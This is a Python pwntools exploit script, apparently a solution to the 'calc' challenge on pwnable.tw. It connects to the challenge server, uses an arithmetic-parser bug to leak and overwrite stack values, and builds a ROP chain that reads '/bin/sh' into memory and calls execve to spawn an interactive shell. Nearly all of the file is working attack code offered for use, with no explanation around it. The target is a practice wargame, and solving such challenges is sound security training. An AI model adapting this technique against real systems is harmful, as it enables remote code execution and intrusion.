#!/home/thomason/.virtualenv/pwnshop/bin/python

from pwn import *


context.arch = "i386"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
# context.terminal = ["tmux", "neww"]

r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)

HOST = "chall.pwnable.tw"
PORT = 10100
LOCAL = False
elf = ELF("./calc")
libc = elf.libc

if LOCAL:
    # p = process(elf.file.name)
    # gdb.attach(p, """
    #         """)
    p = gdb.debug(elf.file.name, """
            # b *0x80493f6
            b *0x8049433
            c
            """)
else:
    context.log_level = "info"
    p = remote(HOST, PORT)

# Exploit starts here
pop_eax = 0x805c34b
pop_edcbx = 0x80701d0 
read = 0x806E717
int0x80 = 0x8049a21 
bss = 0x80ECF80 
payload = [
        # read
        pop_eax, 3,
        pop_edcbx, 20, bss, 0,
        read, 0, 0,
        # sys_execve
        pop_eax, 0xb, 
        pop_edcbx, 0, 0, bss,
        int0x80,
        ]

ptr = 0x169
rl() # welcome msg
for i in payload:
    # get the current value on stack 
    sl('+' + str(ptr))
    leak = int(rl()[:-1])
    i -= leak

    # manipulate the stack
    if i == 0:
        pass
    if i > 0:
        sl('+' + str(ptr) + '+' + str(i))
    if i < 0:
        sl('+' + str(ptr) + str(i))
    rl() # clear buffer
    ptr += 1
    sleep(0.3)

sl("DONE")
sl("/bin/sh\x00")

p.interactive()

